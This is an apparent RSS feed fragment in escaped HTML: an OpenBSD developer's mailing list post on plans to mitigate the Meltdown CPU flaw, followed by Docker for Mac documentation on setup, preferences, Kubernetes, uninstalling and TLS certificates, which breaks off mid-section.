Date:       &lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;r=1&amp;amp;w=2&amp;amp;b=201801&quot;&gt;2018-01-06 4:52:20&lt;/a&gt;
Message-ID: &lt;a href=&quot;https://marc.info/?i=CAKKmsNhd_2XQ3Z9Lx-P6XxPLLXBZ3n5ATN7iMiOAL5sJTJ9zjQ%20()%20mail%20!%20gmail%20!%20com&quot;&gt;CAKKmsNhd_2XQ3Z9Lx-P6XxPLLXBZ3n5ATN7iMiOAL5sJTJ9zjQ () mail ! gmail ! com&lt;/a&gt;&lt;/span&gt;
[&lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;m=151521435721902&amp;amp;q=raw&quot;&gt;Download message RAW&lt;/a&gt;]&lt;/strong&gt;

So, yes, we the OpenBSD developers are not totally asleep and a handful of
us are working out how to deal with Intel's fuck-up aka the Meltdown
attack.  While we have the advantage of less complexity in this area (e.g.,
no 32bit-on-64bit compat), there's still a pile of details to work through
about what has to be *always* in the page tables vs what can/should/must be
hidden.

Do KARL or other features of OpenBSD mitigate this?  Not particularly.  If
you're running code from multiple trust domains then yeah, you're largely
at risk.

We have received *no* non-public information.  I've seen posts elsewhere by
other *BSD people implying that they receive little or no prior warning, so
I have no reason to believe this was specific to OpenBSD and/or our
philosophy.  Personally, I do find it....amusing? that public announcements
were moved up after the issue was deduced from development discussions and
commits to a different open source OS project.  Aren't we all glad that
this was under embargo and strongly believe in the future value of
embargoes?

Unless something unexpected happens, we'll be applying the workaround to
amd64 first and then working out what to do for i386 and arm* (if still
though to be necessary for arm) after that.  No promises on only applying
it to Intel CPUs or knobs to disable it, yet: we'll see how complex that
would make things.  As always, our own developer laptops are the first
targets, so we're invested in it working and being usable.


Philip Guenther
guenther@openbsd.org
&lt;strong&gt;[&lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;m=151521426921898&amp;amp;w=2&quot;&gt;prev in list&lt;/a&gt;] [&lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;m=151521436221903&amp;amp;w=2&quot;&gt;next in list&lt;/a&gt;] [&lt;span&gt;prev in thread&lt;/span&gt;] [&lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;m=151521473321941&amp;amp;w=2&quot;&gt;next in thread&lt;/a&gt;] &lt;/strong&gt;
&lt;/pre&gt;

&lt;center&gt;&lt;a href=&quot;https://marc.info/?q=configure&quot;&gt;Configure&lt;/a&gt; | &lt;a href=&quot;https://marc.info/?q=about&quot;&gt;About&lt;/a&gt; | &lt;a href=&quot;https://marc.info/?q=news&quot;&gt;News&lt;/a&gt; | &lt;a href=&quot;mailto:webguy@marc.info?subject=Add%20a%20list%20to%20MARC&quot;&gt;Add a list&lt;/a&gt; | Sponsored by &lt;a href=&quot;http://www.korelogic.com/&quot;&gt;KoreLogic&lt;/a&gt;&lt;/center&gt;
&lt;/body&gt;</description>
<pubDate>Sat, 06 Jan 2018 08:34:09 +0000</pubDate>
<dc:creator>fcambus</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://marc.info/?l=openbsd-tech&amp;m=151521435721902&amp;w=2</dc:identifier>
</item>
<item>
<title>Docker for Mac with Kubernetes</title>
<link>https://docs.docker.com/docker-for-mac/#kubernetes</link>
<guid isPermaLink="true" >https://docs.docker.com/docker-for-mac/#kubernetes</guid>
<description>&lt;span class=&quot;reading-time&quot; title=&quot;Estimated reading time&quot;&gt;&lt;span class=&quot;reading-time-label&quot;&gt;Estimated reading time:&lt;/span&gt; 18 minutes&lt;/span&gt;
&lt;p&gt;Welcome to Docker for Mac!&lt;/p&gt;
&lt;p&gt;Docker is a full development platform for creating containerized apps, and Docker for Mac is the best way to get started with Docker on a Mac.&lt;/p&gt;
&lt;blockquote readability=&quot;7.9846153846154&quot;&gt;
&lt;p&gt;&lt;strong&gt;Got Docker for Mac?&lt;/strong&gt; If you have not yet installed Docker for Mac, see &lt;a href=&quot;/docker-for-mac/install/&quot;&gt;Install Docker for Mac&lt;/a&gt; for an explanation of stable and edge channels, system requirements, and download/install information.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote id=&quot;what-to-know-before-you-install&quot; readability=&quot;5.1452991452991&quot;&gt;
&lt;p&gt;&lt;strong&gt;Looking for system requirements?&lt;/strong&gt; Check out &lt;a href=&quot;/docker-for-mac/install/#what-to-know-before-you-install&quot;&gt;What to know before you install&lt;/a&gt;, which has moved to the new install topic.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;check-versions-of-docker-engine-compose-and-machine&quot;&gt;Check versions of Docker Engine, Compose, and Machine&lt;/h2&gt;
&lt;p&gt;Run these commands to test if your versions of &lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-machine&lt;/code&gt; are up-to-date and compatible with &lt;code class=&quot;highlighter-rouge&quot;&gt;Docker.app&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot; readability=&quot;8.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
Docker version 17.03.0-ce, build 60ccb22

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker-compose &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
docker-compose version 1.11.2, build dfed245

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker-machine &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
docker-machine version 0.10.0, build 76ed2a6
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: The above is an example. Your output will differ if you are running different (e.g., newer) versions.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;explore-the-application-and-run-examples&quot;&gt;Explore the application and run examples&lt;/h2&gt;
&lt;ol readability=&quot;18.373220875066&quot;&gt;&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;Open a command-line terminal, and run some Docker commands to verify that Docker is working as expected.&lt;/p&gt;
&lt;p&gt;Some good commands to try are &lt;code class=&quot;highlighter-rouge&quot;&gt;docker version&lt;/code&gt; to check that you have the latest release installed, and &lt;code class=&quot;highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run hello-world&lt;/code&gt; to verify that Docker is running.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;10.752166377816&quot;&gt;
&lt;p&gt;For something more adventurous, start a Dockerized web server.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80:80 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; webserver nginx
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;If the image is not found locally, Docker will pull it from Docker Hub.&lt;/p&gt;
&lt;p&gt;In a web browser, go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://localhost/&lt;/code&gt; to bring up the home page. (Since you specified the default HTTP port, it isn’t necessary to append &lt;code class=&quot;highlighter-rouge&quot;&gt;:80&lt;/code&gt; at the end of the URL.)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/hello-world-nginx.png&quot; alt=&quot;nginx home page&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;8.4776785714286&quot;&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Early beta releases used &lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt; as the hostname to build the URL. Now, ports are exposed on the private IP addresses of the VM and forwarded to &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; with no other host name set. See also, &lt;a href=&quot;/docker-for-mac/release-notes/&quot;&gt;Release Notes&lt;/a&gt; for Beta 9.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;Run &lt;code class=&quot;highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; while your web server is running to see details on the webserver container.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-none&quot;&gt;    CONTAINER ID        IMAGE                COMMAND                  CREATED              STATUS              PORTS                              NAMES
    56f433965490        nginx                &quot;nginx -g 'daemon off&quot;   About a minute ago   Up About a minute   0.0.0.0:80-&amp;gt;80/tcp, 443/tcp   webserver
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;15&quot;&gt;
&lt;p&gt;Stop or remove containers and images.&lt;/p&gt;
&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; webserver will continue to run in the container on that port until you stop and/or remove the container. If you want to stop the webserver, type: &lt;code class=&quot;highlighter-rouge&quot;&gt;docker stop webserver&lt;/code&gt; and start it again with &lt;code class=&quot;highlighter-rouge&quot;&gt;docker start webserver&lt;/code&gt;. A stopped container will not show up with &lt;code class=&quot;highlighter-rouge&quot;&gt;docker ps&lt;/code&gt;; for that, you need to run &lt;code class=&quot;highlighter-rouge&quot;&gt;docker ps -a&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To stop and remove the running container with a single command, type: &lt;code class=&quot;highlighter-rouge&quot;&gt;docker rm -f webserver&lt;/code&gt;. This will remove the container, but not the &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; image. You can list local images with &lt;code class=&quot;highlighter-rouge&quot;&gt;docker images&lt;/code&gt;. You might want to keep some images around so that you don’t have to pull them again from Docker Hub. To remove an image you no longer need, use &lt;code class=&quot;highlighter-rouge&quot;&gt;docker rmi&lt;/code&gt; followed by an image ID or image name. For example, &lt;code class=&quot;highlighter-rouge&quot;&gt;docker rmi nginx&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;Want more example applications?&lt;/strong&gt; &lt;a href=&quot;/get-started/&quot;&gt;Get Started&lt;/a&gt; and &lt;a href=&quot;/samples/&quot;&gt;Samples&lt;/a&gt; are great places to start.&lt;/p&gt;
&lt;h2 id=&quot;preferences&quot;&gt;Preferences&lt;/h2&gt;
&lt;p&gt;Choose &lt;img src=&quot;/docker-for-mac/images/whale-x.png&quot; alt=&quot;whale menu&quot; class=&quot;inline&quot;/&gt; -&amp;gt; &lt;strong&gt;Preferences&lt;/strong&gt; from the menu bar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/menu-prefs-selected.png&quot; alt=&quot;Docker context menu&quot;/&gt;&lt;/p&gt;
&lt;p&gt;You can set the following runtime options.&lt;/p&gt;
&lt;blockquote readability=&quot;6.3684210526316&quot;&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The above example shows a user signed in for integrated Docker Cloud access. To learn more about the feature, see &lt;a href=&quot;#docker-cloud&quot;&gt;Docker Cloud&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;general&quot;&gt;General&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings.png&quot; alt=&quot;Preferences&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;auto-start-update-backups-usage-data&quot;&gt;Auto-start, update, backups, usage data&lt;/h4&gt;
&lt;ul readability=&quot;10.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;Docker for Mac is set to automatically &lt;strong&gt;start Docker when you log in&lt;/strong&gt;. Uncheck this option if you don’t want Docker to start when you open your session.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;Docker for Mac is set to &lt;strong&gt;automatically check for updates&lt;/strong&gt; and notify you when an update is available. If an update is found, click &lt;strong&gt;OK&lt;/strong&gt; to accept and install it (or cancel to keep the current version). If you disable the check for updates, you can still find out about updates manually by choosing &lt;img src=&quot;/docker-for-mac/images/whale-x.png&quot; alt=&quot;whale menu&quot; class=&quot;inline&quot;/&gt; -&amp;gt; &lt;strong&gt;Check for Updates&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;Check &lt;strong&gt;Include VM in Time Machine backups&lt;/strong&gt; to back up the Docker for Mac virtual machine. (By default, this is unchecked.)&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;You have the option to &lt;strong&gt;Securely store Docker logins in MacOS keychain&lt;/strong&gt;, enabled by default. To “opt out” of storing your Docker login credentials, uncheck this option.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;strong&gt;Send usage statistics&lt;/strong&gt; — You can set Docker for Mac to auto-send diagnostics, crash reports, and usage data. This information can help Docker improve the application and get more context for troubleshooting problems. Uncheck this to opt out and prevent auto-send of data. Docker may prompt for more information in some cases, even with auto-send enabled.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;file-sharing&quot;&gt;File sharing&lt;/h3&gt;
&lt;p&gt;You can decide which directories on your Mac to share with containers.&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;Add a Directory&lt;/strong&gt; - Click &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt; and navigate to the directory you want to add.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings-file-share.png&quot; alt=&quot;File Sharing&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;Click &lt;strong&gt;Apply &amp;amp; Restart&lt;/strong&gt; to make the directory available to containers using Docker’s bind mount (&lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt;) feature.&lt;/p&gt;
&lt;p&gt;There are some limitations on the directories that can be shared:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;See &lt;a href=&quot;/docker-for-mac/osxfs/#namespaces&quot;&gt;Namespaces&lt;/a&gt; in the topic on &lt;a href=&quot;/docker-for-mac/osxfs/&quot;&gt;osxfs file system sharing&lt;/a&gt; for more information.&lt;/p&gt;
&lt;blockquote readability=&quot;7.6685393258427&quot;&gt;
&lt;p&gt;&lt;strong&gt;Tip&lt;/strong&gt;: File sharing is required for volume mounting if the project lives outside of the &lt;code class=&quot;highlighter-rouge&quot;&gt;/Users&lt;/code&gt; directory. In that case, share the drive where the Dockerfile and volume are located. Otherwise, you will get file not found or cannot start service errors at runtime. (See also &lt;a href=&quot;/docker-for-mac/troubleshoot/#volume-mounting-requires-file-sharing-for-any-project-directories-outside-of-users&quot;&gt;Volume mounting requires file sharing for any project directories outside of &lt;code class=&quot;highlighter-rouge&quot;&gt;/Users&lt;/code&gt;&lt;/a&gt;.)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;advanced&quot;&gt;Advanced&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings-advanced.png&quot; alt=&quot;Advanced Preference settings-advanced&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;cpus&quot;&gt;CPUs&lt;/h4&gt;
&lt;p&gt;By default, Docker for Mac is set to use half the number of processors available on the host machine. You can increase processing power for the app by setting this to a higher number, or lower it to have Docker for Mac use fewer computing resources.&lt;/p&gt;
&lt;h4 id=&quot;memory&quot;&gt;Memory&lt;/h4&gt;
&lt;p&gt;By default, Docker for Mac is set to use &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; GB runtime memory, allocated from the total available memory on your Mac. You can increase the RAM on the app to get faster performance by setting this number higher (for example to &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt;) or lower (to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;) if you want Docker for Mac to use less memory.&lt;/p&gt;
&lt;h4 id=&quot;disk-image-location-storage&quot;&gt;Disk image location (storage)&lt;/h4&gt;
&lt;p&gt;You can specify the &lt;strong&gt;Disk image location&lt;/strong&gt; of the Linux volume; i.e., where containers and images are stored.&lt;/p&gt;
&lt;p&gt;You can move the disk image location.&lt;/p&gt;
&lt;p&gt;If you attempt to move the disk image to a location that already has one, you will get a prompt asking if you want to use the existing image or replace it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings-advanced-beta.png&quot; alt=&quot;Advanced settings&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;http-proxy-settings&quot;&gt;HTTP proxy settings&lt;/h3&gt;
&lt;p&gt;Docker for Mac will detect HTTP/HTTPS Proxy Settings and automatically propagate these to Docker and to your containers. For example, if you set your proxy settings to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://proxy.example.com&lt;/code&gt;, Docker will use this proxy when pulling containers.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings-proxies.png&quot; alt=&quot;Proxies settings&quot;/&gt;&lt;/p&gt;

&lt;h3 id=&quot;docker-daemon&quot;&gt;Docker Daemon&lt;/h3&gt;
&lt;p&gt;You can configure options on the Docker daemon that determine how your containers will run. You can configure some &lt;strong&gt;Basic&lt;/strong&gt; options on the daemon with interactive settings, or switch to &lt;strong&gt;Advanced&lt;/strong&gt; to edit the JSON directly.&lt;/p&gt;
&lt;p&gt;The settings offered on &lt;strong&gt;Basic&lt;/strong&gt; dialog can be configured directly in the JSON as well. This version just surfaces some of the common settings to make it easier to configure them.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings-advanced-experimental-beta.png&quot; alt=&quot;Daemon&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;experimental-mode&quot;&gt;Experimental mode&lt;/h4&gt;
&lt;p&gt;Both Docker for Mac Stable and Edge releases have experimental features enabled on Docker Engine, as described in the &lt;a href=&quot;https://github.com/moby/moby/blob/master/experimental/README.md&quot;&gt;Docker Experimental Features README&lt;/a&gt; on GitHub.&lt;/p&gt;
&lt;p&gt;Experimental features are not appropriate for production environments or workloads. They are meant to be sandbox experiments for new ideas. Some experimental features may become incorporated into upcoming stable releases, but others may be modified or pulled from subsequent Edge releases, and never released on Stable.&lt;/p&gt;
&lt;p&gt;On both Edge and Stable releases, you can toggle &lt;strong&gt;experimental mode&lt;/strong&gt; on and off. If you toggle it off, Docker for Mac uses the current generally available release of Docker Engine.&lt;/p&gt;
&lt;p&gt;You can check whether you are running experimental mode or not by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;docker version&lt;/code&gt; on the command line. Experimental mode is listed under &lt;code class=&quot;highlighter-rouge&quot;&gt;Server&lt;/code&gt; data. If &lt;code class=&quot;highlighter-rouge&quot;&gt;Experimental&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;, then Docker is running in experimental mode, as shown here. (If &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;, Experimental mode is off.)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker version
Client:
 Version:      1.13.0-rc3
 API version:  1.25
 Go version:   go1.7.3
 Git commit:   4d92237
 Built:        Tue Dec  6 01:15:44 2016
 OS/Arch:      darwin/amd64

Server:
 Version:      1.13.0-rc3
 API version:  1.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;minimum version 1.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 Go version:   go1.7.3
 Git commit:   4d92237
 Built:        Tue Dec  6 01:15:44 2016
 OS/Arch:      linux/amd64
 Experimental: &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4 id=&quot;custom-registries&quot;&gt;Custom registries&lt;/h4&gt;
&lt;p&gt;As an alternative to using &lt;a href=&quot;https://hub.docker.com/&quot;&gt;Docker Hub&lt;/a&gt; to store your public or private images or &lt;a href=&quot;/datacenter/dtr/2.1/guides/index.md&quot;&gt;Docker Trusted Registry&lt;/a&gt;, you can use Docker to set up your own insecure &lt;a href=&quot;/registry/introduction.md&quot;&gt;registry&lt;/a&gt;. Add URLs for insecure registries and registry mirrors on which to host your images.&lt;/p&gt;
&lt;p&gt;See also, &lt;a href=&quot;/docker-for-mac/faqs.md#how-do-i-add-custom-ca-certificates&quot;&gt;How do I add custom CA certificates?&lt;/a&gt; and &lt;a href=&quot;/docker-for-mac/faqs.md#how-do-i-client-certificates&quot;&gt;How do I add client certificates&lt;/a&gt; in the FAQs.&lt;/p&gt;
&lt;h4 id=&quot;edit-the-daemon-configuration-file&quot;&gt;Edit the daemon configuration file&lt;/h4&gt;
&lt;p&gt;On the &lt;strong&gt;Daemon -&amp;gt; Advanced dialog&lt;/strong&gt;, you can directly configure the daemon from the JSON file, and determine entirely how your containers will run. For a full list of options on the Docker daemon, see &lt;a href=&quot;/engine/reference/commandline/dockerd.md&quot;&gt;daemon&lt;/a&gt; in the Docker Engine command line reference.&lt;/p&gt;
&lt;p&gt;After editing the daemon configuration , click &lt;strong&gt;Apply &amp;amp; Restart&lt;/strong&gt; to save it and reboot Docker. Or, to cancel changes, click another preference tab, then choose to discard or not apply changes when asked.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings-daemon-beta.png&quot; alt=&quot;Docker Daemon&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;kubernetes&quot;&gt;Kubernetes&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Kubernetes is only available in Docker for Mac 17.12 CE Edge.&lt;/strong&gt; Kubernetes support is not included in Docker for Mac 17.12 CE Stable. To find out more about Stable and Edge channels and how to switch between them, see &lt;a href=&quot;/docker-for-mac/#general&quot;&gt;General configuration&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Docker for Mac 17.12 CE Edge includes a standalone Kubernetes server that runs on your Mac, so that you can test deploying your Docker workloads on Kubernetes.&lt;/p&gt;
&lt;p&gt;The Kubernetes client command, &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt;, is included and configured to connect to the local Kubernetes server. If you have &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; already installed and pointing to some other environment, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;minikube&lt;/code&gt; or a GKE cluster, be sure to change context so that &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; is pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-for-desktop&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;kubectl config get-contexts
kubectl config use-context docker-for-desktop
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;If you installed &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; with Homebrew, or by some other method, and experience conflicts, remove &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/bin/kubectl&lt;/code&gt;.&lt;/p&gt;
&lt;ul readability=&quot;10.296905222437&quot;&gt;&lt;li readability=&quot;9&quot;&gt;
&lt;p&gt;To enable Kubernetes support and install a standalone instance of Kubernetes running as a Docker container, select &lt;strong&gt;Enable Kubernetes&lt;/strong&gt; and click the &lt;strong&gt;Apply and restart&lt;/strong&gt; button.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/kubernetes/kubernetes-enable.png&quot; alt=&quot;Enable Kubernetes&quot;/&gt;&lt;/p&gt;
&lt;p&gt;An internet connection is required. Images required to run the Kubernetes server are downloaded and instantiated as containers, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/bin/kubectl&lt;/code&gt; command is installed on your Mac.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/kubernetes/kubernetes-install-complete.png&quot; alt=&quot;Installation complete&quot;/&gt;&lt;/p&gt;
&lt;p&gt;When Kubernetes is enabled and running, an additional status bar item displays at the bottom right of the Docker for Mac Preferences dialog.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/kubernetes/kubernetes-status.png&quot; alt=&quot;Kubernetes status&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;By default, Kubernetes containers are hidden from commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;docker service ls&lt;/code&gt;, because managing them manually is not supported. To make them visible, select &lt;strong&gt;Show system containers (advanced)&lt;/strong&gt; and click &lt;strong&gt;Apply and restart&lt;/strong&gt;. Most users do not need this option.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4.625468164794&quot;&gt;
&lt;p&gt;To disable Kubernetes support at any time, deselect &lt;strong&gt;Enable Kubernetes&lt;/strong&gt;. The Kubernetes containers are stopped and removed, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/bin/kubectl&lt;/code&gt; command is removed.&lt;/p&gt;
&lt;p&gt;For more about using the Kubernetes integration with Docker for Mac, see &lt;a href=&quot;/docker-for-mac/kubernetes.md&quot;&gt;Deploy to Kubernetes&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;uninstall-or-reset&quot;&gt;Uninstall or reset&lt;/h2&gt;
&lt;p&gt;Choose &lt;img src=&quot;/docker-for-mac/images/whale-x.png&quot; alt=&quot;whale menu&quot; class=&quot;inline&quot;/&gt; -&amp;gt; &lt;strong&gt;Preferences&lt;/strong&gt; from the menu bar, then click &lt;strong&gt;Uninstall / Reset&lt;/strong&gt; on the Preferences dialog.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/settings-uninstall.png&quot; alt=&quot;Uninstall or reset Docker&quot;/&gt;&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;Remove all data&lt;/strong&gt; - This option removes/resets all Docker data &lt;em&gt;without&lt;/em&gt; a reset to factory defaults (which would cause you to lose settings).&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;Uninstall&lt;/strong&gt; - Choose this option to remove Docker for Mac from your system.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;strong&gt;Reset to factory defaults&lt;/strong&gt; - Choose this option to reset all options on Docker for Mac to its initial state, the same as when it was first installed.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;uninstall-from-the-command-line&quot;&gt;Uninstall from the command line&lt;/h3&gt;
&lt;p&gt;Alternatively, you can uninstall Docker for Mac from the command line with this command: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;DockerforMacPath&amp;gt; --uninstall&lt;/code&gt;. If Docker is installed in the default location, the following command will provide a clean uninstall.&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/Applications/Docker.app/Contents/MacOS/Docker &lt;span class=&quot;nt&quot;&gt;--uninstall&lt;/span&gt;
Docker is running, exiting...
Docker uninstalled successfully. You can move the Docker application to the trash.
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;You might want to use the command-line uninstall if, for example, you find that the app is non-functional, and you cannot uninstall it from the menu.&lt;/p&gt;
&lt;h2 id=&quot;add-tls-certificates&quot;&gt;Add TLS certificates&lt;/h2&gt;
&lt;p&gt;You can add trusted Certificate Authorities (CAs) (used to verify registry server certificates) and client certificates (used to authenticate to registries) to your Docker daemon.&lt;/p&gt;
&lt;h3 id=&quot;add-custom-ca-certificates-server-side&quot;&gt;Add custom CA certificates (server side)&lt;/h3&gt;
&lt;p&gt;All trusted CAs (root or intermediate) are supported. Docker for Mac creates a certificate bundle of all user-trusted CAs based on the Mac Keychain, and appends it to Moby trusted certificates. So if an enterprise SSL certificate is trusted by the user on the host, it will be trusted by Docker for Mac.&lt;/p&gt;
&lt;p&gt;To manually add a custom, self-signed certificate, start by adding the certificate to the Mac’s keychain, which will be picked up by Docker for Mac. Here is an example.&lt;/p&gt;
